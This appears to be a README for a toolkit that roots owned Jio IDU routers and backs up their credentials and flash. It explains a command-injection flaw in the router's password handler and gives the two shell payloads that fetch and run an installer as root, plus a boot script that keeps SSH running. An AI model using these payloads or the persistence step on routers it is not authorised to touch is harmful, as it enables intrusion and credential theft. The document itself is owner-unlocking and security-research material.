> ## Legal notice and disclaimer
>
> **Read this before you do anything.**
>
> - This software is provided **"as is", without warranty of any kind**, express
>   or implied. It may fail, behave unexpectedly, or leave your device in a
>   state you did not want.
> - **You use it entirely at your own risk, and on your own responsibility.**
>   To the fullest extent permitted by law, the authors and contributors accept
>   no liability for any damage, data loss, device failure, service
>   interruption, legal consequence, or breach of any agreement arising from
>   this project or its use.
> - **Compliance is your job.** Make sure what you do is lawful where you live
>   and allowed by any agreement that applies to you — these units are normally
>   carrier-supplied, and changing one can breach your service terms or void a
>   warranty.
> - **Only use it on hardware you own**, or hardware you have explicit written
>   permission to test. Using it against equipment you do not own or control may
>   be unlawful.
> - **No vendor code, no secrets, no infringement.** This is an independent,
>   clean-room security research project, built only from the publicly
>   observable behaviour of hardware the author owns. It contains no
>   manufacturer's or carrier's code, firmware, documentation, or confidential
>   information, and it is not derived from any of them.
> - **No affiliation.** This project is not connected to, endorsed by, or
>   supported by any manufacturer, carrier, or vendor. Product and company
>   names are used only to describe what the tool works with, and all
>   trademarks belong to their owners.
> - **Rights-holder requests are welcome.** If you hold rights in something you
>   believe this project touches, say so via this repository's issues and it
>   will be dealt with promptly — including removal of anything that should not
>   be here.
> - **No support, and no promised outcome.** It is shared for security research
>   and personal use.
>
> By downloading, running, or otherwise using any part of this project, you
> accept these terms. If you do not accept them, do not use it.

---

# idu

**Unlock a JIDU (Jio IDU) router and take a full backup of it.**

This little toolkit talks to your router's own web interface and does two things:

1. **Unlock** it — installs a permanent `root` SSH login, so you can get inside.
2. **Back it up** — saves its factory passwords and a complete copy of its flash.

It does **not** write firmware. Nothing here flashes OpenWrt or otherwise
changes the router's operating system.

Two files do the work — pick the driver for your computer:

```
flash.sh     the friendly driver for macOS and Linux — start here
flash.ps1    the same driver for Windows (PowerShell)
idu.py       the engine under both (drive it directly if you're scripting)
```

---


## Does my router work with this?

| Family | Models | What you get |
| --- | --- | --- |
| MediaTek 6j01 | JIDU 6101 / 6201 / 6401 / 6601 / **6701** | root SSH + full backup |
| Qualcomm 6j11 | JIDU 6111 / 6411 / 6611 / 6811 / 6911 | root SSH + full backup |

Not sure? Run `./flash.sh check` — it changes nothing and tells you. A unit on
firmware `R2.0.19.5` can be unlocked; on `R3.2.3` and newer the vendor closed
the door this tool uses, and it will say *not unlockable*.

*(On Windows every `./flash.sh` in this README is `.\flash.ps1` — see
[On Windows](#on-windows). If you've not downloaded anything yet, start at
[Getting the files](#getting-the-files-start-here-if-this-is-all-new).)*

Two prerequisites:

- **The router must already be set up** — setup wizard finished, admin password
  set. A factory-reset unit keeps its whole web API locked until the wizard is
  done, so if you just reset it, finish that first.
- It must be a unit **you own**. See the legal notice above.

## What you'll need

- The router, powered on, with your computer on the same network as it.
- The router's **admin password** — the one you use to log into its web page.
- A **Mac, Linux or Windows** computer with **Python 3** (macOS:
  `xcode-select --install` provides it; Linux: your package manager; Windows:
  `winget install Python.Python.3.12`). The launcher installs anything else it
  needs into a local `.venv/` folder on first run.
- On Windows, also the **OpenSSH client**, and use `flash.ps1` rather than
  `flash.sh` — see *On Windows* below.
- On Linux only: the **`expect`** program (`sudo apt install expect` or
  similar — macOS has it built in). It's used when a password has to be typed
  into SSH for you.

Want to install OpenWrt as well? This tool doesn't do that — it stops at root
access and a backup, on purpose. When you're ready to go further, the manual
procedure is written out slowly, step by step, in
[**OPENWRT.md**](OPENWRT.md) — with prebuilt images in the
[**firmware download folder**](https://drive.google.com/drive/folders/16OvJoZeZFTx4dXRZWfGMlsy-RXDB54_h).

## Getting the files (start here if this is all new)

You need two things: the project folder, and a **terminal** — a window where you
type commands instead of clicking — open *inside* that folder.

> **In a hurry?** Open a terminal first (step 2 below), then this one line does
> steps 1 to 3 for you — downloads the project, unpacks it, and puts you inside
> it:
>
> ```sh
> curl -L https://github.com/wpfyorg/idu-unlock/archive/refs/heads/main.tar.gz \
>   | tar xz && cd idu-unlock-main && chmod +x flash.sh idu.py
> ```
>
> ```powershell
> Invoke-WebRequest https://github.com/wpfyorg/idu-unlock/archive/refs/heads/main.zip -OutFile idu-unlock.zip; Expand-Archive idu-unlock.zip -DestinationPath .; cd idu-unlock-main
> ```
>
> `chmod +x` is there because a downloaded copy loses the "this is runnable"
> flag that a `git clone` keeps. Then carry on at step 4 to check it worked.

**1. Download the project.** Pick whichever of these you understand:

- **With git**, if you have it (or want it — it makes updating easy):

  ```sh
  git clone https://github.com/wpfyorg/idu-unlock.git
  ```

  No git? macOS offers to install it the first time you type `git` (say yes);
  on Linux it's `sudo apt install git`; on Windows, `winget install Git.Git`.
- **Without git:** open
  [the repository page](https://github.com/wpfyorg/idu-unlock), click the green
  **Code** button, choose **Download ZIP**, then unpack it (Windows:
  right-click the file → *Extract All*; macOS: double-click it).

**2. Open a terminal.**

| Your computer | How to open one |
| --- | --- |
| macOS | `Cmd`+`Space`, type `Terminal`, press Enter |
| Windows | press `Win`, type `PowerShell`, press Enter |
| Linux | `Ctrl`+`Alt`+`T` on most desktops |

**3. Move into the folder** with `cd` (it stands for *change directory*). Type
`cd` and a space, then drag the `idu-unlock` folder from your file manager onto
the terminal window — that types the path for you. Press Enter.

Or type the path yourself. Downloads land in `Downloads` unless you moved them:

```sh
cd ~/Downloads/idu-unlock        # macOS / Linux
cd $HOME\Downloads\idu-unlock    # Windows PowerShell
```

**4. Check you're in the right place.** List what's in the folder:

```sh
ls
```

That's a lowercase **L**, not a one — and it works the same in PowerShell. You
should see `flash.sh`, `flash.ps1` and `idu.py`. If you see only another folder
(unzipping often adds an extra level), go into it with `cd idu-unlock` and
`ls` again.

**5. Run it.** From here on, everything in this README uses `./flash.sh`; on
Windows use `.\flash.ps1` instead:

```sh
./flash.sh check        # macOS / Linux
.\flash.ps1 check       # Windows
```

> **Getting "permission denied"?** A ZIP download loses file permissions (a git
> clone keeps them). Fix it once, in the folder:
>
> ```sh
> chmod +x flash.sh idu.py
> ```

## The whole job, step by step

> **On Windows**, every `./flash.sh` below is `.\flash.ps1` instead — otherwise
> the steps are identical. See *On Windows* at the end of this section.

**Step 0 — log out of the router's web page, and be in the project folder.** The
router allows only *one* admin login at a time, so close its web interface
first. If you haven't downloaded the project and `cd`'d into it yet, do
*Getting the files* above — then come back here.

**Step 1 — look before you leap:**

```sh
./flash.sh detect
```

The tool says hello and prints the model, e.g.
`[+] JIDU6701 · ... · family: mediatek`. Nothing is changed. If this fails,
see *If something goes wrong* below.

> The router blocks logins for a while after ~5 wrong passwords. If it refuses
> yours, fix the password first — don't sit there retrying.

**Step 2 — back it up (never skip this one):**

```sh
./flash.sh backup
```

Installs the root SSH key, then saves the router's factory passwords and a full
copy of its flash memory into a folder named after its Wi-Fi network. **Treat
that folder like a set of keys**, because it is one — don't share it, and don't
put it on GitHub.

**Step 3 — you're in:**

```sh
ssh -i ~/.ssh/idu_rsa root@192.168.31.1
```

The unlock also drops a small boot script on the router so SSH keeps working
after it reboots. `./flash.sh unlock` does just this step on its own, and at the
end it prints the exact `ssh` command for your unit's address.

That's the whole job — or run `./flash.sh` with no arguments and it walks the
same steps in order.

## On Windows

Windows has everything this tool needs — Python, OpenSSH, a firewall — but not
the `flash.sh` wrapper, because that's a bash script. Use **`flash.ps1`**:
same commands, same questions, same options.

**One-time setup**

1. **Python 3** — `winget install Python.Python.3.12`. If the installer offers a
   checkbox for *Add python.exe to PATH*, tick it.
2. **OpenSSH client** — Windows 10 and 11 normally ship it. Check by running
   `ssh -V`; if that isn't recognised, open PowerShell **as administrator** and
   run:

   ```powershell
   Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
   ```

**Run it**

Open PowerShell, `cd` into the project folder, then:

```powershell
.\flash.ps1 check      # can this unit be unlocked? (changes nothing)
.\flash.ps1 backup     # unlock it, then back it up
```

The `.\` is not optional: PowerShell won't run a script from the current folder
by name alone. If it answers *"running scripts is disabled on this system"*,
relax that for this window only and try again:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

That lasts until you close the window — nothing about your system is changed
permanently.

**The one Windows-specific catch: port 80.** To unlock the router, the tool
starts a tiny web server on your PC and the *router* fetches the installer from
it. The first time you unlock, Windows Firewall asks whether to allow it — click
**Allow**, for **Private** networks (that's your home network; *Public* is what
you'd be on in a café).

If an unlock ends in *"the router did not call back"*, the firewall is still the
likely culprit: allow `python.exe`, or run PowerShell as administrator so the
rule can be created. Failing that, something else already owns port 80 — IIS and
the *World Wide Web Publishing Service* are the usual suspects. To see what:

```powershell
netstat -ano | findstr :80
```

A reboot clears a stuck holder.

**Rather not?** `flash.sh` runs unchanged under **WSL** or **Git Bash**, exactly
as it does on Linux. Native PowerShell is just fewer moving parts.

## All the commands

| Command | What it does | Touches anything? |
| --- | --- | --- |
| `./flash.sh check` | Can this unit be unlocked? | no — read-only |
| `./flash.sh detect` | What model is it? | no — read-only |
| `./flash.sh backup` | Credentials + full flash image | unlocks, then reads |
| `./flash.sh unlock` | Root SSH that survives reboots | installs a key |
| `./flash.sh` | Unlock, then back up, with prompts | installs a key |

On Windows use `.\flash.ps1` in place of `./flash.sh` for every one of these.

Add-ons for any command: `--router URL` (default `https://192.168.31.1`),
`--password PW`, `--key PATH` (default `~/.ssh/idu_rsa`). In PowerShell the
single-dash spellings (`-Router`, `-Password`, `-Key`) work too.

Sorting a pile of units? `check` exits `0` when unlockable and `2` when not, so
a loop can triage them without you reading anything:

```sh
for ip in $(cat idus.txt); do
  ./flash.sh --router "https://$ip" --password "$PW" check
  echo "$ip -> $?"
done
```

```powershell
foreach ($ip in Get-Content idus.txt) {
  .\flash.ps1 --router "https://$ip" --password $PW check
  "$ip -> $LASTEXITCODE"
}
```

### Driving the engine directly

```
idu.py [--router URL] [--password PW] [--key PATH] {check,detect,unlock,backup}
```

Same commands, plus `check --json` (machine-readable verdict) and
`backup --full-chip` (also image mtd0, the whole SPI chip).

## Jargon, translated

| Word | Means |
| --- | --- |
| **SSH** | A secure remote terminal — how you "get inside" the router. |
| **root** | The all-powerful user account on a Linux system. |
| **firmware** | The operating system stored inside the router. |
| **partition** | A named slice of the flash chip (the MFG one holds passwords). |
| **u-boot** | The tiny bootloader that starts the router before the OS. |
| **UART** | A serial-cable port on the board, for when software can't help. |
| **`/WCGI`** | The router's internal web API — what its web page talks to. |

## If something goes wrong

- **"another admin session is already open"** — log out of the router's web
  page (or reboot the router) and retry. One login at a time is a hard rule.
- **"the router is factory-reset"** — finish its setup wizard in a browser,
  then come back.
- **Wrong password, logins blocked** — the router locks out after ~5 failures;
  wait it out, then double-check the password.
- **`check` says not unlockable** — the unit is on `R3.x` firmware. Nothing in
  this repo can unlock it.
- **"nothing arrives at the callback"** — your computer's firewall is probably
  eating the router's requests; the tool needs your machine reachable on
  port 80 and on the router's own subnet. On Windows, allow `python.exe` through
  the firewall, or run PowerShell as administrator — see *On Windows* above.
- **`cd`: "no such file or directory"** — the path is wrong. Type `ls` to see
  where you are, and drag the folder onto the terminal to get its path right.
- **`Permission denied` running `./flash.sh`** — a ZIP download drops the
  executable bit; run `chmod +x flash.sh idu.py` once.
- **Windows: *"running scripts is disabled on this system"*** — allow scripts
  for the current window with
  `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`.
- **Windows: *"`ssh` is not recognized"*** — install the OpenSSH client, under
  *On Windows* above.
- **"`ssh` is not installed, or not on PATH"** — that's this tool saying the
  same thing, with the install command for your platform.
- **SSH refused after a reboot** — the unlock didn't fully land; run
  `./flash.sh unlock` again.
- **The backup folder is huge** — normal. Every partition is imaged; mtd5 and
  mtd6 alone are around 140 MB and 90 MB. `--full-chip` adds more.

## For the curious: how it works

`/WCGI`, the router's own JSON-RPC endpoint, has a password handler that builds
a shell command with your password in it — unescaped. A password containing
`$( ... )` therefore *runs* that as root. The password rules are the puzzle:
8–32 characters, no `|`, but `$`, `(`, `)`, `{`, `}` and `${IFS}` all pass. So
the installer arrives in two steps, each fitting the 32-character budget:

```sh
Aa1$(curl${IFS}192.168.31.51>/a)   # 32 chars — fetch the installer
Aa1$(sh${IFS}/a)                   # 16 chars — run it
```

The `Aa1` prefix is randomised per run, because the router remembers the last
three passwords per account. (`/a` is the shortest writable absolute path,
which caps the download address at 13 characters.)

To *stay* in, installing a key isn't enough: the vendor's dropbear init script
force-disables SSH on every boot, so the installer drops its own init script
(`/etc/init.d/idu-ssh`, `START=99`) that starts SSH anyway. Note: the stock
dropbear rejects ed25519 keys — the tool generates an RSA one for you.

Where the secrets hide — worth knowing, since the backup collects them:

- The **u-boot console credentials are not in the u-boot environment** — they
  sit as plain `KEY=VALUE` text in the **MFG partition (`/dev/mtd7`)**, next to
  the Wi-Fi PSK and the web password.
- The partition *named* `u-boot-env` (`mtd2`) is **empty**. The real
  environment lives in the UBI volume **`/dev/ubi0_0`** (inside mtd5), per
  `/etc/fw_env.config`. A second, vendor-specific environment sits in **mtd8**.

## What's in a backup

```
AirFiber-XXXXXX/
├── credentials.txt        u-boot + web + Wi-Fi + ACS + serial + MAC
├── uboot_credentials.env  UBOOT_USERNAME=… / UBOOT_PASSWORD=…
├── partitions.txt         cat /proc/mtd
├── uboot_env.txt          fw_printenv, both environments
├── factory_env.txt        the raw MFG key=value block
└── backup/mtdN_NAME.bin   every partition (mtd5/mtd6 are ~140/90 MB)
```

Putting a single partition back (if you know what you're doing):

```sh
scp backup/mtd1_BL2.bin root@192.168.31.1:/tmp/
ssh root@192.168.31.1 'mtd write /tmp/mtd1_BL2.bin BL2'
```

## Licence

**Noncommercial only.** Use it, change it and share it for noncommercial
purposes — but no selling it, no reselling it, and no shipping it inside a
commercial product or service. If you make a video, stream or tutorial that
features this project, credit it and link back to this repository.

The full terms are in [LICENSE](LICENSE) — PolyForm Noncommercial 1.0.0, with
the attribution condition above added. That makes this project
*source-available*, not open source in the OSI sense; commercial rights are not
granted, so get in touch if you need different terms.

## Provenance

Written as a clean-room implementation: the protocol flow is the device's own
API, and the code shares nothing substantive with any existing PoC (the only
overlaps are Python/HTTP idioms such as the `application/json` header).

An earlier version of this project also *automated* the community's two-stage
OpenWrt install; that is not part of this tool, and nothing here writes firmware.
The procedure itself is documented in
[the-diy-daddy/6j01_6j11](https://github.com/the-diy-daddy/6j01_6j11) — credit
for working it out belongs there. It is also written out for typing by hand in
[OPENWRT.md](OPENWRT.md). That repository ships no licence, and neither did the
PoC this work started from, so neither is redistributed here.
